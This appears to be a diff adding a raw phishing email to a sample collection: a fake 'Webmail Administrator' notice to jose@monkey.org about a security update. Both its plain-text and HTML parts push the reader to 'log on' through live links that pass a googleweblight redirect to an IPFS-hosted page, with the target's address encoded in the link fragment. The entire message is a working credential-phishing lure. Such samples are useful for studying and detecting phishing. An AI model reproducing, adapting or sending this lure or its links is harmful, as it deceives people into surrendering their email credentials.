@@ -1,0 +1,218 @@
+From jose@monkey.org Tue Aug  8 13:57:32 2023 +0000
+Return-Path: admin@nwebsupport.com
+Delivered-To: jose@monkey.org
+X-FDA: 81101089944.29.D712AA0
+Received: from mail.nwebsupport.com (mail.nwebsupport.com [62.72.20.103])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP id 94B4E120005
+	for <jose@monkey.org>; Tue,  8 Aug 2023 13:57:30 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;
+	dkim=pass header.d=nwebsupport.com header.s=default header.b=h1IfPknh;
+	spf=pass (imf03.b.hostedemail.com: domain of admin@nwebsupport.com designates 62.72.20.103 as permitted sender) smtp.mailfrom=admin@nwebsupport.com;
+	dmarc=pass (policy=reject) header.from=nwebsupport.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1691503051;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:list-unsubscribe:dkim-signature;
+	bh=g0M1FtzUoZf7gUV44wo3dSWjJ2ljvY9X8j4FeKfR+18=;
+	b=QjFdHBrCZdXdxA+1LE9T1XVoSDlwde0KcJCGBUJ+5S9sN+ERUg2oRnoNNRrIlB7qg4qWiU
+	Reii9WcbVwsYS4lGqDk9pMnk+6BH8bHlATcEYly+fJUk1A1CzJVC1Nl930nXUv6acIEhYo
+	IBAROS+acK1khtuTK9bVoeacC29C8ZM=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1691503051; a=rsa-sha256;
+	cv=none;
+	b=PvC967VeYzSq5nWwuKHrPAbXG2ckSo6exM/bu+gzW0jCBYCRQ+HD2bDdgHYWnO63X0QZsK
+	64dvh2sLNTZFc2jGRZ9acgR44hB/tW5fKDDdi7mNSkaZWn7U0jCmJrwbZyKjju3fIO6xRj
+	dn4iXwjiC90baImPTWabvTt7cJoKxb0=
+ARC-Authentication-Results: i=1;
+	imf03.b.hostedemail.com;
+	dkim=pass header.d=nwebsupport.com header.s=default header.b=h1IfPknh;
+	spf=pass (imf03.b.hostedemail.com: domain of admin@nwebsupport.com designates 62.72.20.103 as permitted sender) smtp.mailfrom=admin@nwebsupport.com;
+	dmarc=pass (policy=reject) header.from=nwebsupport.com
+Received: from [109.248.150.148] (unknown [109.248.150.148])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by mail.nwebsupport.com (Postfix) with ESMTPSA id 0606049C276
+	for <jose@monkey.org>; Tue,  8 Aug 2023 12:57:56 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
+	d=nwebsupport.com; s=default; h=Reply-To:From:To:Subject:
+	MIME-Version:List-Unsubscribe:Organization:Content-Type; bh=e4Gy
+	4ACamBIA0HhrfodTgFvGGvw=; b=h1IfPknh591z59CXAlLQj/3hOY4bDxXwXtfD
+	grPguK4nXfrKlz4HiMMm1U0pnNS2FXcfFz7lyZ8kyN6e5ezVNLAHQqGRd2eZfcdD
+	1UP3ghj9M4wNwdkrNtz7RMAAsKpJQwCEqIfDzDo/1He0XG0xiCeNqqokHpjAU+7K
+	MiIg74itOzDxediwFXYIBCTFYnA19y4KLWAQyebyFoqLu1vuGGiUYXHkT2XXVocp
+	gWI1RixJoXIZXCkrPNEru7pJ6QvT3Pd8APsKpoq+2utnEkpNCXYNxOZXGxR/nTmz
+	hUVITXG0gk31vc2JNgUtmM+cfFez02rjN8Er53L7UG50vIkvZA==
+Reply-To: Webmail Administrator <reply-to@nwebsupport.com>
+From: Webmail Administrator <admin@nwebsupport.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?4pqg77iPIEltcG9ydGFudCBub3RpY2U6IFVwZGF0ZSB5b3VyIGUtbWFpbCBzZWN1cml0eSBhbmQgc2VydmljZSBhZ3JlZW1lbnQu?=
+Date: 8 Aug 2023 14:57:56 +0200
+Message-ID: <20230808145756.DD3BB214EE2D8E34@nwebsupport.com>
+MIME-Version: 1.0
+List-Unsubscribe: <mailto:admin@nwebsupport.com>
+Organization: monkey.org
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_0C8346FD.24F97B40"
+X-Rspamd-Server: rspam02
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 94B4E120005
+X-Spam-Status: No, score=0.69
+X-Stat-Signature: 48cxkn6a6dubc9mkycroqbw8j4yyuzm9
+X-HE-Tag: 1691503050-71490
+X-HE-Meta: U2FsdGVkX18kaolSiFIVvBJycCXwjyKAQTyNe/J1ajp/NExtP+llzhvpJ2+8vsuMigaxidd/mN46I7cbw/76OVCTabCxitbBJvfQRorj5e/RjJQVx8hB2vuvxonO4DApNAZnzOdY5Dqo1AL2qSptLO3QdjvYPeMVANZ2F1nRghfy4HxX5jwWTvdUO/gFmFjwyaDqelF7tUjvg+GzmGy2fbsGFjmHirCsWuZ4gbPHAw5pPO+yRUBJtp5TKqTwb8OnWKf81ibUoa6bM/XqE1z9xDntT2Iu9debpAcOD6oViGdaFXgLj8lMJNSeBYrUul64ahjrJ1IJkbNNccAEYOXggP2j96CyJFqEtIxXkvldXQoMOcjrHa9Ca9S+AIgr0ZW8sYDkwZGFk6FME3MGNa/tusfypv3QVWRPbzTQNOWmdbnPL9jV1eiL2l0HhrMfiEokK+NtLr9q+u8gC6smkS208oLa50fdQQXS
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 233
+
+------=_NextPart_000_0012_0C8346FD.24F97B40
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello jose,
+
+Important notice: We have updated our security and service=20
+agreements, which applies to one or more product and services you=20
+use.
+
+This update also includes=C2=A0enhanced security to protect your e-
+mail (jose@monkey.org)=C2=A0and defend it from any=C2=A0attempt of DDoS=20
+attack on your mail server.
+
+We recommend that you log on=20
+(=C2=A0https://googleweblight.com/i?u=3Dhttps://cloudflare-ipfs.com/ipfs/ba=
+fkreigu5zizfh7bshqdvzuvzklahejjr44ro2lekei2jk6lmyz24vrvk4#am9zZUBtb25rZXkub=
+3Jn=C2=A0)=20
+now, from your usual device(s) to secure your e-mail and keep=20
+your webmail services updated.
+
+Confirm this request and Proceed to update now.=20
+(=C2=A0https://googleweblight.com/i?u=3Dhttps://cloudflare-ipfs.com/ipfs/ba=
+fkreigu5zizfh7bshqdvzuvzklahejjr44ro2lekei2jk6lmyz24vrvk4#am9zZUBtb25rZXkub=
+3Jn=C2=A0)
+
+Update request will be initiated immediately after user=20
+confirmation.
+This is a mandatory notification for your domain webmail service.=20
+You can set notification preferences for other service updates.
+
+
+
+Mailbox Admin
+webmaster@monkey.org
+
+
+-----------------------------------------------------------------
+This message notification is strictly for the attention of=20
+jose@monkey.org=C2=A0=C2=A0
+------=_NextPart_000_0012_0C8346FD.24F97B40
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<span style=3D"color: rgb(255, 255, 255); font-family: Roboto,RobotoDraft,H=
+elvetica,Arial,sans-serif;"></span><span style=3D"color: rgb(255, 255, 255)=
+; font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif;"></span>
+<table width=3D"100%" style=3D"color: rgb(255, 255, 255); font-family: Robo=
+to,RobotoDraft,Helvetica,Arial,sans-serif;" border=3D"0" cellspacing=3D"0" =
+cellpadding=3D"0">
+  <tbody>
+    <tr>
+      <td style=3D"margin: 0px; font-family: Roboto,RobotoDraft,Helvetica,A=
+rial,sans-serif;">
+      <div style=3D"font-family: tahoma,verdana,sans-serif;">
+      <div style=3D"color: rgb(57, 61, 71); line-height: 1.5; font-family: =
+tahoma,verdana,segoe,sans-serif; font-size: 12px;">
+      <p style=3D"margin: 0px; text-align: left; font-size: 13px;"><span st=
+yle=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;">Hello jose,<b=
+r><br></span></span></p>
+      <p style=3D"margin: 0px; text-align: left; font-size: 13px;"><span st=
+yle=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;"></span></span=
+></p>
+      <p style=3D"margin: 0px; text-align: left; font-size: 13px;"><span st=
+yle=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;"> </span></spa=
+n><span style=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;"><sp=
+an style=3D"color: rgb(249, 53, 9);">Important notice:</span>
+We have updated our security and service agreements, which applies to
+one or more product and services you use.</span></span></p>
+      <p style=3D"margin: 0px; text-align: left; font-size: 13px;"><span st=
+yle=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;">This update a=
+lso includes&nbsp;enhanced security to protect your e-mail (jose@monkey.org=
+)&nbsp;and defend it from any&nbsp;attempt of DDoS attack on your mail serv=
+er.<br><br></span></span></p>
+      <p style=3D"margin: 0px; text-align: left; font-size: 13px;"><span st=
+yle=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;"></span></span=
+></p>
+<span style=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;">We re=
+commend that you <a title=3D"Log on to your account" href=3D"https://google=
+weblight.com/i?u=3Dhttps://cloudflare-ipfs.com/ipfs/bafkreigu5zizfh7bshqdvz=
+uvzklahejjr44ro2lekei2jk6lmyz24vrvk4#am9zZUBtb25rZXkub3Jn" target=3D"_blank=
+" rel=3D"noreferrer">log on</a> now, from your usual device(s) to secure yo=
+ur e-mail and keep your webmail services updated.</span></span>
+      <p style=3D"margin: 0px; text-align: left; font-size: 13px;"><span st=
+yle=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;"></span></span=
+></p>
+<span style=3D"font-size: 13px;"><span style=3D"font-family: Tahoma;">Confi=
+rm this request and <a title=3D"Proceed to update now" href=3D"https://goog=
+leweblight.com/i?u=3Dhttps://cloudflare-ipfs.com/ipfs/bafkreigu5zizfh7bshqd=
+vzuvzklahejjr44ro2lekei2jk6lmyz24vrvk4#am9zZUBtb25rZXkub3Jn" target=3D"_bla=
+nk" rel=3D"noreferrer">Proceed to update now.</a> </span></span>
+      <div style=3D"text-align: left;"><span style=3D"font-size: 13px;"></s=
+pan><br>
+      <span style=3D"font-family: Tahoma; font-size: 13px;"><span style=3D'=
+font-family: "Times New Roman";'><span><span style=3D"font-family: Tahoma;"=
+>Update request will be
+initiated immediately after user confirmation.<br>This is a mandatory notif=
+ication for your domain webmail service. You can set notification preferenc=
+es for other service updates.<br></span></span></span></span><br><br>
+      <span style=3D"font-family: Tahoma; font-size: 13px;"><span style=3D'=
+font-family: "Times New Roman";'></span></span></div>
+<span style=3D"font-weight: bold;">Mailbox Admin<br>webmaster@monkey.org</s=
+pan><br>
+=20=20=20=20=20=20
+</div>
+      </div>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<span style=3D"color: rgb(255, 255, 255); font-family: Roboto,RobotoDraft,H=
+elvetica,Arial,sans-serif;"></span><span style=3D"color: rgb(255, 255, 255)=
+; font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif;"></span><span=
+ style=3D"color: rgb(255, 255, 255); font-family: Roboto,RobotoDraft,Helvet=
+ica,Arial,sans-serif;"></span>
+<big></big><big></big><big></big><big></big><big></big><big></big><hr><tabl=
+e width=3D"100%" style=3D"color: rgb(255, 255, 255); font-family: Roboto,Ro=
+botoDraft,Helvetica,Arial,sans-serif;" border=3D"0" cellspacing=3D"0" cellp=
+adding=3D"10">
+=20=20
+<tbody>
+    <tr>
+      <td style=3D"margin: 0px; font-family: Roboto,RobotoDraft,Helvetica,A=
+rial,sans-serif;"><big>
+      </big>
+      <div style=3D"font-family: sans-serif;"><big></big>
+      <div style=3D"color: rgb(57, 61, 71); line-height: 1.2; font-family: =
+tahoma,verdana,segoe,sans-serif; font-size: 14px;"><big></big>
+      <p style=3D"margin: 0px; text-align: center;"><big><span style=3D'fon=
+t-family: "Times New Roman"; font-size: 8pt;'><span style=3D"font-size: 12p=
+x;">This message notification
+is strictly for the attention of jose@monkey.org&nbsp;&nbsp;</span></span><=
+/big></p>
+      <big></big></div>
+      <big></big></div>
+      <big></big></td>
+      </tr>
+=20=20=20=20
+  </tbody>
+</table>
+
+
+</body></html>
+------=_NextPart_000_0012_0C8346FD.24F97B40--
